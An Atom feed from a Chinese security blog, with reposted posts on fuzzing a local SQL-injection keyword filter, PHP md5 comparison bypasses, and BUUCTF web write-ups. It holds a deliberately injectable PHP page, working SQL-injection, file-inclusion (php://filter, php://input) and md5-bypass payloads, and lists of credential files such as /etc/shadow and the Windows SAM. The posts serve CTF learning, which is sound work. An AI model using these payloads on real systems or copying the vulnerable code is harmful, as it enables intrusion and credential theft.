<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://jinqipiaopiao.github.io/</id>
    <title>Gridea</title>
    <updated>2021-06-22T05:06:49.585Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://jinqipiaopiao.github.io/"/>
    <link rel="self" href="https://jinqipiaopiao.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://jinqipiaopiao.github.io/images/avatar.png</logo>
    <icon>https://jinqipiaopiao.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[SQL注入过滤字符的Fuzz脚本测试]]></title>
        <id>https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/</id>
        <link href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">
        </link>
        <updated>2021-06-22T04:34:15.000Z</updated>
        <content type="html"><![CDATA[<p>Get.php</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Sql Waf Test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div style=&quot;text-align:center;&quot;&gt;
&lt;form method=&quot;GET&quot; action=&quot;&quot;&gt;
	&lt;h1&gt;Insert Data&lt;/h1&gt;
	&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your username&quot;&gt;
	&lt;br&gt;&lt;br&gt;
	&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your password&quot;&gt;
	&lt;br&gt;&lt;br&gt;
	&lt;input type=&quot;submit&quot; name=&quot;submit1&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
&lt;?php 
$black_list=&quot;/select|sleep|and|or|union|\&quot;|'|--|#|where|from|limit/i&quot;;
$con = mysqli_connect(&quot;127.0.0.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);
mysqli_query($con,&quot;create database test&quot;);
mysqli_select_db($con,&quot;test&quot;);
mysqli_query($con,&quot;create table tb_user
	(
	uid int(11) primary key auto_increment not null,
	username varchar(50) not null,
	password varchar(50) not null,
	UNIQUE(username)
	)&quot;);
if(isset($_GET['submit1'])){
	$username = $_GET['username'];
	$password = md5($_GET['password']);
	if(preg_match($black_list,$username)){
		echo &quot;&lt;h2&gt;Illegal Char&lt;h2&gt;&quot;;
	}else{
		if(empty($username) || empty($password)){
			echo &quot;&lt;h2&gt;Username or Password can not be empty&lt;/h2&gt;&quot;;
		}else{
			$insert_sql = mysqli_query($con,&quot;insert into tb_user value(0,'$username','$password')&quot;);
			if($insert_sql){
				echo &quot;&lt;h2&gt;Insert Success&lt;/h2&gt;&quot;;
			}else{
				echo &quot;&lt;h2&gt;Insert Fail&lt;/h2&gt;&quot;;
			}
		}
	}
}
?&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;div style=&quot;text-align:center;&quot;&gt;
&lt;form method=&quot;GET&quot; action=&quot;&quot;&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
&lt;h1&gt;Query Data&lt;/h1&gt;
&lt;input type=&quot;text&quot; name=&quot;query&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Query Username&quot;&gt;
&lt;br&gt;&lt;br&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit2&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
&lt;?php 
if(isset($_GET['submit2'])){
$query_name = $_GET['query'];
if(preg_match($black_list,$query_name)){
die(&quot;&lt;h2&gt;Illegal Char&lt;/h2&gt;&quot;);
}else{
if(empty($query_name)){
echo &quot;&lt;h2&gt;Query data can not be empty&lt;/h2&gt;&quot;;
}else{
$query_data = mysqli_query($con,&quot;select * from tb_user where username='$query_name'&quot;);
if($query_data){
$sql_data = mysqli_fetch_assoc($query_data);
echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump($sql_data);
}else{
echo &quot;&lt;h2&gt;Query Fail&lt;/h2&gt;&quot;;
}
}
}
}
?&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>sql_waf_test.py</p>
<pre><code>import requests

sql_char = ['select',
		'union',
		'and',
		'or',
		'sleep',
		'where',
		'from',
		'limit',
		'group',
		'by',
		'like',
		'prepare',
		'as',
		'if',
		'char',
		'ascii',
		'mid',
		'left',
		'right',
		'substring',
		'handler',
		'updatexml',
		'extractvalue',
		'benchmark',
		'insert',
		'update',
		'all',
		'@',
		'#',
		'^',
		'&amp;',
		'*',
		'\'',
		'&quot;',
		'~',
		'`',
		'(',
		')',
		'--',
		'=',
		'/',
		'\\',
		' ']

for char in sql_char:
res = requests.get(&quot;http://127.0.0.1/get.php?query=&quot;+char+&quot;&amp;submit2=sbumit&quot;)
if 'Illegal Char' in res.text:
	print(&quot;该字符是非法字符: {0}&quot;.format(char))
else:
	print(&quot;通过: {0}&quot;.format(char))
</code></pre>
<p>PS C:\Users\Administrator\Desktop&gt; python .\sql_waf_test.py<br>
该字符是非法字符: select<br>
该字符是非法字符: union<br>
该字符是非法字符: and<br>
该字符是非法字符: or<br>
该字符是非法字符: sleep<br>
该字符是非法字符: where<br>
该字符是非法字符: from<br>
该字符是非法字符: limit<br>
通过: group<br>
通过: by<br>
通过: like<br>
通过: prepare<br>
通过: as<br>
通过: if<br>
通过: char<br>
通过: ascii<br>
通过: mid<br>
通过: left<br>
通过: right<br>
通过: substring<br>
该字符是非法字符: handler<br>
通过: updatexml<br>
通过: extractvalue<br>
通过: benchmark<br>
通过: insert<br>
通过: update<br>
通过: all<br>
通过: @<br>
通过: #<br>
通过: ^<br>
通过: &amp;<br>
通过: *<br>
该字符是非法字符: '<br>
该字符是非法字符: &quot;<br>
通过: ~<br>
通过: `<br>
通过: (<br>
通过: )<br>
该字符是非法字符: --<br>
通过: =<br>
通过: /<br>
通过: <br>
通过:</p>
<p>Post.php</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Sql Waf Test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div style=&quot;text-align:center;&quot;&gt;
&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
	&lt;h1&gt;Insert Data&lt;/h1&gt;
	&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your username&quot;&gt;
	&lt;br&gt;&lt;br&gt;
	&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your password&quot;&gt;
	&lt;br&gt;&lt;br&gt;
	&lt;input type=&quot;submit&quot; name=&quot;submit1&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
&lt;?php 
$black_list=&quot;/select|and|or|union|limit/i&quot;;
$con = mysqli_connect(&quot;127.0.0.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);
mysqli_query($con,&quot;create database test&quot;);
mysqli_select_db($con,&quot;test&quot;);
mysqli_query($con,&quot;create table tb_user
	(
	uid int(11) primary key auto_increment not null,
	username varchar(50) not null,
	password varchar(50) not null,
	UNIQUE(username)
	)&quot;);
if(isset($_POST['submit1'])){
	$username = $_POST['username'];
	$password = md5($_POST['password']);
	if(preg_match($black_list,$username)){
		echo &quot;&lt;h2&gt;Illegal Char&lt;h2&gt;&quot;;
	}else{
		if(empty($username) || empty($password)){
			echo &quot;&lt;h2&gt;Username or Password can not be empty&lt;/h2&gt;&quot;;
		}else{
			$insert_sql = mysqli_query($con,&quot;insert into tb_user value(0,'$username','$password')&quot;);
			if($insert_sql){
				echo &quot;&lt;h2&gt;Insert Success&lt;/h2&gt;&quot;;
			}else{
				echo &quot;&lt;h2&gt;Insert Fail&lt;/h2&gt;&quot;;
			}
		}
	}
}
?&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;div style=&quot;text-align:center;&quot;&gt;
&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
&lt;h1&gt;Query Data&lt;/h1&gt;
&lt;input type=&quot;text&quot; name=&quot;query&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Query Username&quot;&gt;
&lt;br&gt;&lt;br&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit2&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
&lt;?php 
if(isset($_POST['submit2'])){
$query_name = $_POST['query'];
if(preg_match($black_list,$query_name)){
die(&quot;&lt;h2&gt;Illegal Char&lt;/h2&gt;&quot;);
}else{
if(empty($query_name)){
echo &quot;&lt;h2&gt;Query data can not be empty&lt;/h2&gt;&quot;;
}else{
$query_data = mysqli_query($con,&quot;select * from tb_user where username='$query_name'&quot;);
if($query_data){
$sql_data = mysqli_fetch_assoc($query_data);
echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump($sql_data);
}else{
echo &quot;&lt;h2&gt;Query Fail&lt;/h2&gt;&quot;;
}
}
}
}
?&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>sql_waf_test.py</p>
<pre><code>import requests

sql_char = ['select',
		'union',
		'and',
		'or',
		'sleep',
		'where',
		'from',
		'limit',
		'group',
		'by',
		'like',
		'prepare',
		'as',
		'if',
		'char',
		'ascii',
		'mid',
		'left',
		'right',
		'substring',
		'handler',
		'updatexml',
		'extractvalue',
		'benchmark',
		'insert',
		'update',
		'all',
		'@',
		'#',
		'^',
		'&amp;',
		'*',
		'\'',
		'&quot;',
		'~',
		'`',
		'(',
		')',
		'--',
		'=',
		'/',
		'\\',
		' ']
url = &quot;http://127.0.0.1/get.php&quot;
header = {
'Host':'127.0.0.1',
'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding':'gzip, deflate',
'Content-Type':'application/x-www-form-urlencoded'
}
for char in sql_char:
post_data = &quot;query=test&quot;+char+&quot;&amp;submit2=sbumit&quot;
res = requests.post(url,data=post_data,headers=header)
if 'Illegal Char' in res.text:
	print(&quot;该字符是非法字符: {0}&quot;.format(char))
else:
	print(&quot;通过: {0}&quot;.format(char))
</code></pre>
<p>PS C:\Users\Administrator\Desktop&gt; python .\sql_waf_test.py<br>
该字符是非法字符: select<br>
该字符是非法字符: union<br>
该字符是非法字符: and<br>
该字符是非法字符: or<br>
通过: sleep<br>
通过: where<br>
通过: from<br>
该字符是非法字符: limit<br>
通过: group<br>
通过: by<br>
通过: like<br>
通过: prepare<br>
通过: as<br>
通过: if<br>
通过: char<br>
通过: ascii<br>
通过: mid<br>
通过: left<br>
通过: right<br>
通过: substring<br>
该字符是非法字符: handler<br>
通过: updatexml<br>
通过: extractvalue<br>
通过: benchmark<br>
通过: insert<br>
通过: update<br>
通过: all<br>
通过: @<br>
通过: #<br>
通过: ^<br>
通过: &amp;<br>
通过: *<br>
通过: '<br>
通过: &quot;<br>
通过: ~<br>
通过: `<br>
通过: (<br>
通过: )<br>
通过: --<br>
通过: =<br>
通过: /<br>
通过: <br>
通过:<br>
————————————————<br>
版权声明：本文为CSDN博主「末 初」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/mochu7777777/article/details/108073359</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[md5相关比较]]></title>
        <id>https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/</id>
        <link href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">
        </link>
        <updated>2021-06-19T07:27:36.000Z</updated>
        <content type="html"><![CDATA[<p>弱比较</p>
<pre><code>if($_POST['a']!=$_POST['b']&amp;&amp; md5($_POST['a'])==md5($_POST['b'])){
die(&quot;success!&quot;);
}
</code></pre>
<p>在这样的弱比较里，0e开头的会被识别成科学计数法，结果均为0，比较时0=0为true绕过<br>
payload：</p>
<pre><code>a=QNKCDZO&amp;b=s878926199a
</code></pre>
<p>常用md5加密后为0的字符串：<br>
240610708，aabg7XSs，aabC9RqS<br>
s878926199a</p>
<p>强比较</p>
<pre><code>if($_POST['a']!==$_POST['b']&amp;&amp; md5($_POST['a'])===md5($_POST['b'])){
die(&quot;success!&quot;);
}
</code></pre>
<p>像这样的强比较，上面的方法就失效了，但是如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面null=null为true绕过<br>
payload：</p>
<pre><code>a[]=1&amp;b[]=2
</code></pre>
<p>强碰撞<br>
if((string)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>!</mo><mo>=</mo><mo>=</mo><mo>(</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">_POST[&#x27;a&#x27;]!==(string)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span>_POST['b'] &amp;&amp; md5(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>)</mo><mo>=</mo><mo>=</mo><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">_POST[&#x27;a&#x27;])===md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>_POST['b'])){<br>
die(&quot;success!&quot;);<br>
}</p>
<p>到强碰撞这里，它用string强行转换成字符串，从而限制了数组绕过这方法，只能输入字符串<br>
先上payload：</p>
<pre><code>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
</code></pre>
<p>这一大长串的编码，他们的md5值是相等的，原理是将hex字符串转化为ascii字符串，并写入到bin文件<br>
考虑到要将一些不可见字符传到服务器，这里使用url编码</p>
<p>以下脚本均为开头那篇师傅的文章摘抄下<br>
这个是将hex写入到bin文件的python脚本源码：</p>
<p>#!coding:utf-8</p>
<pre><code>hexString1 = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2'
hexString2 = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2'

hexList1 = []
intList1 = []
asciiString1 =''

while True:
intString1 = hexString1[0:2]
hexString1 = hexString1[2:]
hexList1.append(intString1)
if (hexString1 == ''):
break

for i in hexList1:
intList1.append(int(i,16))
for j in intList1:
asciiString1 += chr(int(j))

f = open('1.bin','w')
f.write(asciiString1)
f.close()

hexList2 = []
intList2 = []
asciiString2 =''

while True:
intString2 = hexString2[0:2]
hexString2 = hexString2[2:]
hexList2.append(intString2)
if (hexString2 == ''):
break

for i in hexList2:
intList2.append(int(i,16))
for j in intList2:
asciiString2 += chr(int(j))

f = open('2.bin','w')
f.write(asciiString2)
f.close()
</code></pre>
<p>这个是将bin文件内容再次url编码的python脚本源码：</p>
<p>#!coding:utf-8<br>
import urllib</p>
<pre><code>urlString1=''
urlString2 = ''

for line in open('1.bin'):
urlString1 +=  urllib.quote(line)

for line in open('2.bin'):
urlString2 +=  urllib.quote(line)

print urlString1
print urlString2
</code></pre>
<p>这题也可以直接用python调用open并读取文件来传参：</p>
<pre><code>import requests
p1 = open('1.bin')
p2 = open('2.bin')
data = {'param1':p1,'param2':p2}
r = S.post(url,data = data)
print r.text
</code></pre>
<p>我看了师傅的文章后还是很迷，因为不管怎么样，他们的字符串一直都是相同的，甚至连payload的参数都是一样的，但就是能绕过比较，如果有懂这方面的师傅，请务必要教教我(｡･ω･｡)<br>
————————————————<br>
版权声明：本文为CSDN博主「小 白 萝 卜」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/EC_Carrot/article/details/109525162</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BUUCTF]]></title>
        <id>https://jinqipiaopiao.github.io/post/buuctf/</id>
        <link href="https://jinqipiaopiao.github.io/post/buuctf/">
        </link>
        <updated>2021-06-06T06:34:20.000Z</updated>
        <content type="html"><![CDATA[<h1 id="suctf-2019easysql1">[SUCTF 2019]EasySQL1</h1>
<p>输入1，有回显<br>
输入2，有回显，输入非零数字都有回显，输入字母无回显<br>
这道题目需要我们去对后端语句进行猜测</p>
<p>1、输入非零数字得到的回显1和输入其余字符得不到回显=&gt;来判断出内部的查询语句可能存在有||</p>
<p>2、也就是select 输入的数据||内置的一个列名 from 表名=&gt;即为</p>
<pre><code>select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)
</code></pre>
<p>此时的||起到的作用是or的作用</p>
<p>解法1<br>
内置的sql语句为</p>
<pre><code>sql=“select”.post[‘query’].&quot;||flag from Flag&quot;;
</code></pre>
<p>如果<code>$post[‘query’]</code>的数据为*,1，sql语句就变成了</p>
<pre><code>select *,1||flag from Flag
</code></pre>
<p>也就是</p>
<pre><code>select *,1 from Flag
</code></pre>
<p>也就是直接查询出了Flag表中的所有内容<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622963455648.png" alt="" loading="lazy"><br>
解法2<br>
输入的内容为</p>
<pre><code>1;set sql_mode=pipes_as_concat;select 1
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1622963484692.png" alt="" loading="lazy"><br>
我们执行的语句分别为</p>
<pre><code>select 1
set sql_mode=pipes_as_concat
select 1||flag from Flag
</code></pre>
<p>读出flag<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622963518649.png" alt="" loading="lazy"></p>
<p>————————————————<br>
版权声明：本文为CSDN博主「一只小白来了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_44866139/article/details/105857487</p>
<h1 id="actf2020-新生赛include1">[ACTF2020 新生赛]Include1</h1>
<p>include(文件包含漏洞，php伪协议)</p>
<p>查看元素，也并没有有用的信息，联想到题目,include<br>
想起了文件包含漏洞。<br>
构造payload<br>
?file=/../../../../../../flag.php</p>
<p>没有返回东西。看完wq学到了一个新姿势：<br>
php伪代码</p>
<pre><code>https://segmentfault.com/a/1190000018991087
https://www.freebuf.com/column/148886.html
</code></pre>
<p>构造payload<br>
?file=php://filter/read=convert.base64-encode/resource=flag.php<br>
使用 &quot;php://filter&quot;伪协议&quot; 来进行包含。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p>
<p>构造Payload:</p>
<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p>这里需要注意的是使用php://filter伪协议进行文件包含时，需要加上read=convert.base64-encode来对文件内容进行编码</p>
<p>发送请求得到base64编码后的flag.php文件源码:<br>
得到base64加密后的flag.php文件，丢去解密得到flag。</p>
<p>文件包含漏洞</p>
<p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。<br>
`PHP中文件包含函数有以下四种：</p>
<pre><code>require()

require_once()

include()

include_once()

`
</code></pre>
<p>示例代码</p>
<p>如果服务器配置不当，可以目录跨越等等，传个../../../../../etc/passwd等等，可以查阅很多意外的文件。<br>
`windows常见文件：</p>
<pre><code>c:\boot.ini // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

c:\windows\repair\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信息
</code></pre>
<p>linux常见文件：</p>
<pre><code>/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件
</code></pre>
<p>文件包含分本地文件包含和远程文件包含，本地文件包含就是利用服务器的配置不当访问服务器本地的文件，而远程文件包含是在</p>
<p>allow_url_fopen = On（是否允许打开远程文件）</p>
<p>allow_url_include = On（是否允许include/require远程文件）</p>
<p>`<br>
以上两个字段为On时，此时允许服务器包含远程的服务器的文件，这时可以在远程服务器配置一个马.txt之类的，里面写上php代码，让靶机去包含它。</p>
<p>【file://协议】</p>
<p>PHP.ini：</p>
<p>file:// 协议在双off的情况下也可以正常使用；</p>
<p>allow_url_fopen ：off/on</p>
<p>allow_url_include：off/on</p>
<p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
<p>使用方法：</p>
<pre><code>file:// [文件的绝对路径和文件名]

http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt
</code></pre>
<p>【php://协议】</p>
<p>条件：</p>
<p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p>
<p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
<p>参考自：http://php.net/manual/zh/wrappers.php.php#refsect2-wrappers.php-unknown-unknown-unknown-descriptioq</p>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<pre><code>PHP.ini：

php://filter在双off的情况下也可以正常使用；

allow_url_fopen ：off/on

allow_url_include：off/on
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1622964969941.png" alt="" loading="lazy"></figure>
<p>测试现象：<br>
http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622964973937.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622964977636.png" alt="" loading="lazy"></p>
<p>测试现象：</p>
<pre><code>http://127.0.0.1/cmd.php?file=php://input

[POST DATA] &lt;?php phpinfo()?&gt;
</code></pre>
<p>参考自：<br>
https://www.cnblogs.com/cmredkulaa/p/14008645.html</p>
<h1 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h1>
<p>BUFFctf蒋璐媛的秘密<br>
打开在线场景，发现三个大字蒋璐媛<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966646571.png" alt="" loading="lazy"><br>
那么就继续看了，首先就应该看看他的源码了：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966650090.png" alt="" loading="lazy"><br>
打开他的这个下面的php文件瞅瞅：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966653167.png" alt="" loading="lazy"><br>
是个按钮我们就要一一分析了：</p>
<p>按了一下按钮发现：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966655922.png" alt="" loading="lazy"><br>
那就要来看看源码了：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966658952.png" alt="" loading="lazy"><br>
从这里看它是有个action.php,说明它跳的太快用burpsuite抓一下<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966662432.png" alt="" loading="lazy"><br>
看来问题就出在这个ser3t文件上。</p>
<p>那我们就输入一下：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966670380.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966674246.png" alt="" loading="lazy"><br>
因为刚刚刚好有一个题就是用的base64的隐写所以就用这个方法了哈哈哈</p>
<pre><code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1622966678771.png" alt="" loading="lazy"><br>
然后用base64解码即<br>
<img src="https://jinqipiaopiao.github.io//post-images/1622966696532.png" alt="" loading="lazy"></p>
<p>参考自：https://blog.csdn.net/vsdvscs/article/details/116563866</p>
<h1 id="极客大挑战-2019lovesql1">[极客大挑战 2019]LoveSQL1</h1>
